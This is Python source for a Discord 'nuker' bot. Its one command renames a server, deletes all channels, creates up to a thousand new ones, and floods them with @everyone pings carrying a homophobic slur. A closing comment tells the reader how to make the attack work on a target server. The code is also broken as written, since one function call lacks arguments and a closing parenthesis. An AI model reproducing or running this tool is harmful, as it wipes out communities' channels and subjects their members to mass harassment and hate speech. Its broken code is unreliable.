import discord
import asyncio
from discord.ext import commands

TOKEN = 'YOUR_BOT_TOKEN'

NUM_CHANNELS = 1000
NUM_PINGS = 1000
SPAM_MESSAGE = "whar"

intents = discord.Intents.all()
intents.messages = True
intents.guilds = True

bot = commands.Bot(command_prefix='.', intents=intents)


@bot.event
async def on_ready():
  print(f'Logged in as {bot.user}')


async def ping_channel(channel, message, num_pings, rate_limiter):
  for _ in range(num_pings):
    await rate_limiter.acquire()
    await channel.send(message)
    rate_limiter.release()
    await asyncio.sleep(0.1)


@bot.command(name='noke', help='Nuke the server')
async def bomb(ctx):
  print("checkmate attack command executed")
  guild = ctx.guild
  new_name = "rekt was here"
  
  try:
    print(f"Attempting to edit guild name to: {new_name}")
    await guild.edit(name=new_name)

    for channel in guild.channels:
      print(f"Deleting channel: {channel.name}")
      await channel.delete()

    rate_limiter = asyncio.Semaphore(20)
    tasks = []

    for i in range(NUM_CHANNELS):
      channel_name = "nukerwashere"
      channel = await guild.create_text_channel(channel_name)
      print(f"Created channel: {channel_name}")

      ping_task = ping_channel(
          channel,
          "@everyone @here GET NUKED FAGGOTS"
      tasks.append(ping_task)
      asyncio.create_task(ping_task)

    await asyncio.gather(*tasks)

    for channel in guild.channels:
      await channel.send(SPAM_MESSAGE)
      print(f"Sent SPAM_MESSAGE in channel: {channel.name}")

  except discord.Forbidden:
    await ctx.send("I don't have permissions to perform this action.")
    print("Forbidden: I don't have permissions to perform this action.")
  except discord.HTTPException as e:
    await ctx.send(f"An error occurred: {e}")
    print(f"HTTPException: An error occurred: {e}")
  except Exception as e:
    await ctx.send(f"An unexpected error occurred: {e}")
    print(f"Unexpected error: {e}")
    
bot.run('bot token here')

# (DONT COPY) You need to disable community settings on target server for this to work.
